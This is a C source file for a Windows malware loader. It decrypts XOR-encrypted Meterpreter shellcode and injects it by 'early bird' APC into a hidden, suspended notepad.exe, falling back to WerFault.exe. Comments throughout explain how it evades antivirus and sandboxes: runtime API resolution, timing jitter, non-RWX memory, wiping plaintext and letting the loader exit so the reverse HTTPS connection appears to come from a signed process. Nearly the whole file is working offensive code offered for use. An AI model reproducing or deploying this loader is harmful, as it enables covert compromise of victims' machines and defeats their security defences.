/*
 * loader.c — "early bird" APC injection into notepad.exe
 *
 * Why this beats the single-process loaders when AV is catching them:
 *
 *   The previous loaders ran Meterpreter inside themselves — the same process
 *   that spawned, decrypted, and allocated shellcode. Behavioral engines keep
 *   watching that process and kill it within 1–2 seconds of seeing the memory
 *   pattern. Here, the loader:
 *
 *     1. Spawns notepad.exe in CREATE_SUSPENDED state (invisible).
 *     2. XOR-decrypts the shellcode into a local heap buffer.
 *     3. VirtualAllocEx RW in the child, WriteProcessMemory, then
 *        VirtualProtectEx RX — never RWX in either process.
 *     4. QueueUserAPC(shellcode_addr, main_thread, 0) + ResumeThread.
 *        The APC fires before ntdll even reaches the image entry point
 *        ("early bird"). Meterpreter starts inside notepad before the
 *        loader finishes its own cleanup.
 *     5. Loader closes all handles and returns 0 — it disappears.
 *
 *   Meterpreter is now running inside a Microsoft-signed process. The
 *   process that did the suspicious work is already gone. The network
 *   connection comes from notepad.exe, not an unknown PE.
 *
 * Works with both staged (meterpreter/reverse_https) and stageless
 * (meterpreter_reverse_https — underscore, ~200 KB blob embedded).
 * For stageless, update handler.rc: set PAYLOAD windows/x64/meterpreter_reverse_https
 *
 * Patched by build.sh:
 *   __SC_BYTES__   comma-separated 0xNN bytes (XOR-encrypted shellcode)
 *   __KEY_BYTES__  comma-separated 0xNN bytes (32-byte XOR key)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static const unsigned char SC[]  = { __SC_BYTES__ };
static const unsigned char KEY[] = { __KEY_BYTES__ };
#define SC_LEN  (sizeof(SC))
#define KEY_LEN (sizeof(KEY))

/* Runtime-resolved function pointers — nothing suspicious in the IAT */
typedef LPVOID (WINAPI *Fn_VirtualAllocEx)    (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *Fn_WriteProcessMemory) (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef BOOL   (WINAPI *Fn_VirtualProtectEx)   (HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *Fn_QueueUserAPC)       (PAPCFUNC, HANDLE, ULONG_PTR);
typedef DWORD  (WINAPI *Fn_ResumeThread)       (HANDLE);
typedef BOOL   (WINAPI *Fn_TerminateProcess)   (HANDLE, UINT);

/* Volatile wipe — compiler cannot optimise this out */
static void wipe(void *p, SIZE_T n) {
    volatile unsigned char *v = (volatile unsigned char *)p;
    while (n--) *v++ = 0;
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR cmd, int show)
{
    (void)hI; (void)hP; (void)cmd; (void)show;

    /* Jitter: burn short-run sandbox timers before any memory allocation */
    Sleep(2500 + (GetTickCount() % 4000));

    /* ------------------------------------------------------------------ */
    /* Step 1: decrypt shellcode into a local heap buffer                  */
    /* ------------------------------------------------------------------ */
    SIZE_T sc_len = SC_LEN;
    unsigned char *plain = (unsigned char *)HeapAlloc(
        GetProcessHeap(), 0, sc_len);
    if (!plain) return 1;

    for (SIZE_T i = 0; i < sc_len; i++)
        plain[i] = SC[i] ^ KEY[i % KEY_LEN];

    /* ------------------------------------------------------------------ */
    /* Step 2: spawn notepad.exe in suspended state, hidden                */
    /* ------------------------------------------------------------------ */
    STARTUPINFOW si   = {0};
    si.cb             = sizeof(si);
    si.dwFlags        = STARTF_USESHOWWINDOW;
    si.wShowWindow    = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    /* notepad.exe is always present and well-trusted; running it hidden   */
    /* is legal and common (lots of software does it). If this fails for   */
    /* some reason (highly locked-down WDAC policy), fall back to          */
    /* WerFault.exe which is also MS-signed and benign-looking.            */
    wchar_t cmd1[] = L"notepad.exe";
    BOOL ok = CreateProcessW(NULL, cmd1, NULL, NULL, FALSE,
                             CREATE_SUSPENDED | CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);
    if (!ok) {
        wchar_t cmd2[] = L"C:\\Windows\\System32\\WerFault.exe";
        ok = CreateProcessW(cmd2, NULL, NULL, NULL, FALSE,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW,
                            NULL, NULL, &si, &pi);
    }
    if (!ok) {
        wipe(plain, sc_len);
        HeapFree(GetProcessHeap(), 0, plain);
        return 1;
    }

    /* ------------------------------------------------------------------ */
    /* Step 3: resolve APIs at runtime — nothing bound in the IAT          */
    /* ------------------------------------------------------------------ */
    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
#define LOAD(T, name) ((T)GetProcAddress(k32, name))
    Fn_VirtualAllocEx     fVAE  = LOAD(Fn_VirtualAllocEx,     "VirtualAllocEx");
    Fn_WriteProcessMemory fWPM  = LOAD(Fn_WriteProcessMemory,  "WriteProcessMemory");
    Fn_VirtualProtectEx   fVPE  = LOAD(Fn_VirtualProtectEx,   "VirtualProtectEx");
    Fn_QueueUserAPC       fQAPC = LOAD(Fn_QueueUserAPC,       "QueueUserAPC");
    Fn_ResumeThread       fRT   = LOAD(Fn_ResumeThread,       "ResumeThread");
    Fn_TerminateProcess   fTP   = LOAD(Fn_TerminateProcess,   "TerminateProcess");
#undef LOAD

    /* ------------------------------------------------------------------ */
    /* Step 4: allocate RW in the child, write, then flip to RX            */
    /* ------------------------------------------------------------------ */
    LPVOID remote = fVAE(pi.hProcess, NULL, sc_len,
                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        fTP(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        wipe(plain, sc_len);
        HeapFree(GetProcessHeap(), 0, plain);
        return 1;
    }

    fWPM(pi.hProcess, remote, plain, sc_len, NULL);

    /* Wipe local plaintext the moment it's in the child — it's
     * no longer needed here and we don't want it in our heap dump */
    wipe(plain, sc_len);
    HeapFree(GetProcessHeap(), 0, plain);

    /* Flip to RX — never RWX in either process */
    DWORD old_prot;
    fVPE(pi.hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_prot);

    /* ------------------------------------------------------------------ */
    /* Step 5: early-bird APC + resume                                     */
    /* The main thread of a CREATE_SUSPENDED process is alertable at the   */
    /* very start of user-mode execution — the APC fires before ntdll      */
    /* reaches the image entry point. Meterpreter starts running inside    */
    /* notepad.exe before WinMain finishes its own cleanup below.          */
    /* ------------------------------------------------------------------ */
    fQAPC((PAPCFUNC)remote, pi.hThread, 0);
    fRT(pi.hThread);

    /* ------------------------------------------------------------------ */
    /* Step 6: close handles and exit — loader is gone                     */
    /* Meterpreter now owns notepad.exe. No loader process to kill.        */
    /* ------------------------------------------------------------------ */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
